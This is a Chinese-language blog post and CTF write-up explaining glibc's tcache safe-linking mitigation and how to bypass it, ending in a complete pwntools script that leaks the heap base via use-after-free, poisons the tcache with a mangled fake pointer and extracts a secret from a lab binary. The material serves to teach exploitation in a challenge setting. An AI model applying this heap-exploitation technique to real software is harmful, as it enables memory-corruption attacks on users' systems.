---
layout: post
tags: [pwn]
title: "glibc 2.32+ tcache safe-linking"
author: wsxk
date: 2025-3-10
comments: true
---

- [1. glibc 2.32 safe-linking](#1-glibc-232-safe-linking)
  - [1.2 safe-linking 原理](#12-safe-linking-原理)
    - [1.2.1 malloc](#121-malloc)
    - [1.2.2 free](#122-free)
    - [1.2.3 safe-linking 绕过](#123-safe-linking-绕过)
    - [1.2.4 safe-linking 总结](#124-safe-linking-总结)
- [2. glibc 2.35 safe-linking 绕过](#2-glibc-235-safe-linking-绕过)
  - [2.1 利用malloc/free机制修改某个区间的值,并利用tcachebin机制泄露值](#21-利用mallocfree机制修改某个区间的值并利用tcachebin机制泄露值)


# 1. glibc 2.32 safe-linking<br>
safe-linking是 glibc 2.32 版本后 针对 tcache 添加的安全机制。<br>
**其主要的核心思路是修改tcachebin中 free_chunk->next的值，使得tcache poison失效**<br>
## 1.2 safe-linking 原理<br>
safe-linking主要靠异或实现，主要依赖以下两个函数:<br>
```c
#define PROTECT_PTR(pos, ptr)
  ((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))

#define REVEAL_PTR(ptr)  PROTECT_PTR (&ptr, ptr)
```
这两个函数分别在free和malloc函数中被引用<br>

### 1.2.1 malloc<br>
```c
static __always_inline void *
tcache_get (size_t tc_idx)
{
  tcache_entry *e = tcache->entries[tc_idx];
  if (__glibc_unlikely (!aligned_OK (e))) //检查对齐
    malloc_printerr ("malloc(): unaligned tcache chunk detected");
  tcache->entries[tc_idx] = REVEAL_PTR (e->next);
  --(tcache->counts[tc_idx]);
  e->key = 0;
  return (void *) e;
}

```
### 1.2.2 free<br>
```c
static __always_inline void
tcache_put (mchunkptr chunk, size_t tc_idx)
{
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);

  e->key = tcache_key;

  e->next = PROTECT_PTR (&e->next, tcache->entries[tc_idx]);
  tcache->entries[tc_idx] = e;
  ++(tcache->counts[tc_idx]);
}
```

### 1.2.3 safe-linking 绕过<br>
在safe-linking加持下，要想获得tcache中下一个堆块的实际地址，需要知道`pos和ptr`两个值,**即当前堆块的mem地址，和当前堆块的mem地址的值，得知后异或即可**<br>
我们有没有办法得知这两个值呢？<br>
`REVEAL_PTR`函数实现给了我们答案:<br>
```
只需要知道tcachebin中的一个chunk的堆地址，和被混淆的值，我们就能获得下一个chunk的地址指向哪里。
```

### 1.2.4 safe-linking 总结<br>
safe-linking给我们带来了如下结果:<br>
```
1. Alignment checks often prevent directly accessing values
即tcache_get中的对齐检查。

2. Most heap exploits now require a heap pointer leak
即泄露tcache地址，才能继续利用

3. Massaging the heap can get complicated tracking values
追踪调试变得困难
```

# 2. glibc 2.35 safe-linking 绕过<br>
## 2.1 利用malloc/free机制修改某个区间的值,并利用tcachebin机制泄露值<br>
核心原理:<br>
**在malloc一个tcache mem后，mem->key = 0;**<br>
**从tcachebin取一个tcache mem后，tcache->entries[tc_idx]=REVEAL_PTR(mem->next)**<br>

```python
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'

binary_path = './babyheap_level16.0'
libc_path = './libc.so.6'

p = process(binary_path)

def malloc(idx,size):
    p.recvuntil(b"[*] Function (malloc/free/puts/scanf/send_flag/quit): ")
    p.sendline(b"malloc")
    p.recvuntil(b"Index: ")
    p.sendline(str(idx).encode())
    p.recvuntil(b"Size: ")
    p.sendline(str(size).encode())

def free(idx):
    p.recvuntil(b"[*] Function (malloc/free/puts/scanf/send_flag/quit): ")
    p.sendline(b"free")
    p.recvuntil(b"Index: ")
    p.sendline(str(idx).encode())

def puts(idx):
    p.recvuntil(b"[*] Function (malloc/free/puts/scanf/send_flag/quit): ")
    p.sendline(b"puts")
    p.recvuntil(b"Index: ")
    p.sendline(str(idx).encode())

def scanf(idx,content):
    p.recvuntil(b"[*] Function (malloc/free/puts/scanf/send_flag/quit): ")
    p.sendline(b"scanf")
    p.recvuntil(b"Index: ")
    p.sendline(str(idx).encode())
    sleep(0.1)
    p.sendline(content)

def send_flag(secret):
    p.recvuntil(b"[*] Function (malloc/free/puts/scanf/send_flag/quit): ")
    p.sendline(b"send_flag")
    p.recvuntil(b"Secret: ")
    p.sendline(secret)

# leak the heap_base
malloc(0,0x20)
free(0)
puts(0)
p.recvuntil(b"Data: ")
mem_value = u64(p.recvline().strip(b"\n").ljust(8,b"\x00"))
heap_base = mem_value << 12
log.success(f"mem_value: {hex(mem_value)}")
log.success(f"heap_base: {hex(heap_base)}")

# tcache poison 
malloc(0,0x20)
malloc(1,0x20)
free(0)
free(1) # 1 > 0
# bypass safe-linking
fake_addr = 0x433AD0
safe_linking_fake_addr = (heap_base>>12) ^ fake_addr
scanf(1,p64(safe_linking_fake_addr))
malloc(2,0x20)
malloc(3,0x20) # *(fake_addr + 8) = 0 ; and then the tcache->entries[tc_idx] = REVEAL_PTR(fake_addr->next)  = (fake_addr>>12) ^ fake_addr->next

# leak value by uaf
malloc(4,0x20)
free(4)  # 4->next = PROTECT_PTR(&4->next, tcache->entries[tc_idx]) =  (4_addr >> 12)^ tcache->entries[tc_idx]
puts(4)
p.recvuntil(b"Data: ")
secret_mangled = u64(p.recv(8))
log.success(f"secret_mangled: {hex(secret_mangled)}")
secret_demangled1 = (heap_base>>12) ^ secret_mangled
log.success(f"secret_demangled1: {hex(secret_demangled1)}")
secret_demangled2 = (fake_addr>>12) ^ secret_demangled1
log.success(f"secret_demangled2: {hex(secret_demangled2)}")

send_flag(p64(secret_demangled2)+b"\x00"*8)

p.interactive()
```

<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-C22S5YSYL7"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-C22S5YSYL7');
</script>


